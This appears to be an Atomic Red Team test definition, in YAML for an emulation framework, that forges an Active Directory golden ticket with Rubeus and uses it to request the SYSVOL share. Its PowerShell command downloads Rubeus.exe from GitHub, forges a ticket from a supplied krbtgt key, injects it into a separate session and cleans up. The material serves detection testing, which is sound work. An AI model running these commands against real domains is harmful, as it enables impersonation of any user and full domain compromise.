- id: e42d33cd-205c-4acf-ab59-a9f38f6bad9c
  name: Crafting Active Directory golden tickets with Rubeus
  description: 'Once the hash of the special krbtgt user is retrieved it is possible
    to craft Kerberos Ticket Granting Ticket impersonating any user in the Active
    Directory domain.

    This test crafts a Golden Ticket and then performs an SMB request with it for
    the SYSVOL share, thus triggering a service ticket request (event ID 4769).

    The generated ticket is injected in a new empty Windows session and discarded
    after, so it does not pollute the current Windows session.'
  tactic: credential-access
  technique:
    attack_id: T1558.001
    name: 'Steal or Forge Kerberos Tickets: Golden Ticket'
  platforms:
    windows:
      psh:
        command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit
          0} else {exit 1}; then : ; else Write-Host Joining this computer to a domain
          must be done manually; fi; if(Test-Path -Path $Env:temp\rubeus.exe) {exit
          0} else {exit 1}; then : ; else Invoke-Webrequest -Uri https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
          -OutFile $Env:temp\rubeus.exe; fi; Remove-Item $env:TEMP\golden.bat -ErrorAction
          Ignore; Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; cmd.exe /c
          "$Env:temp\rubeus.exe" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
          /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart(''\'') + "."
          + "$ENV:userdnsdomain") /printcmd /outfile:golden; $filename = (Get-ChildItem
          | ? {$_.Name.startswith("golden_")} | Sort-Object -Descending -Property
          LastWriteTime | select -First 1).Name; # create batch file with commands
          to run in a separate "runas /netonly" session; # so we don''t purge Kerberos
          ticket from the current Windows session; # its output goes to golden.txt
          temp file, because we cannot capture "runas /netonly" output otherwise;
          @"; >%TEMP%\golden.txt 2>&1 (; echo Purge existing tickets and create golden
          ticket:; klist purge; cd %temp%; "$Env:temp\rubeus.exe" ptt /ticket:kirbifile;
          echo.; echo Requesting SYSVOL:; dir \\$($ENV:logonserver.TrimStart(''\'')
          + "." + "$ENV:userdnsdomain")\SYSVOL; echo.; echo Tickets after requesting
          SYSVOL:; klist; echo.; echo End of Golden Ticket attack; ); "@ -Replace
          "kirbifile", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat; #
          run batch file in a new empty session (password and username do not matter);
          echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null;
          # wait until the output file has logged the entire attack; do {; Start-Sleep
          1 # wait a bit so the output file has time to be created; Get-Content -Path
          "$env:TEMP\golden.txt" -Wait | ForEach-Object {; if ($_ -match ''End of
          Golden Ticket attack'') { break }; }; } while ($false) # dummy loop so that
          ''break'' can be used; # show output from new empty session; Get-Content
          $env:TEMP\golden.txt; # cleanup temp files; Remove-Item $env:TEMP\golden.bat
          -ErrorAction Ignore; Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - credential-access
  - atomic-red-team
  - t1558.001
  author: Atomic Red Team
  additional_info:
    input_arguments:
      domaincontroller:
        description: Targeted Active Directory domain FQDN
        type: string
        default: $ENV:logonserver.TrimStart('\') + "." + "$ENV:userdnsdomain"
      account:
        description: Account to impersonate
        type: string
        default: $ENV:username
      krbtgt_aes256_key:
        description: Krbtgt AES256 key (you will need to set to match your krbtgt
          key for your domain)
        type: string
        default: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
      local_folder:
        description: Local path of Rubeus executable
        type: path
        default: $Env:temp
      local_executable:
        description: name of the rubeus executable
        type: string
        default: rubeus.exe
      rubeus_url:
        description: URL of Rubeus executable
        type: url
        default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
    dependencies:
    - description: 'Computer must be domain joined

        '
      prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
        {exit 0} else {exit 1}

        '
      get_prereq_command: 'Write-Host Joining this computer to a domain must be done
        manually

        '
    - description: 'Rubeus must exist

        '
      prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
        0} else {exit 1}

        '
      get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}

        '
    technique_created: '2020-02-11T19:13:33.643Z'
    atomic_guid: e42d33cd-205c-4acf-ab59-a9f38f6bad9c
    import_timestamp: '2025-08-25T03:16:02.610019Z'
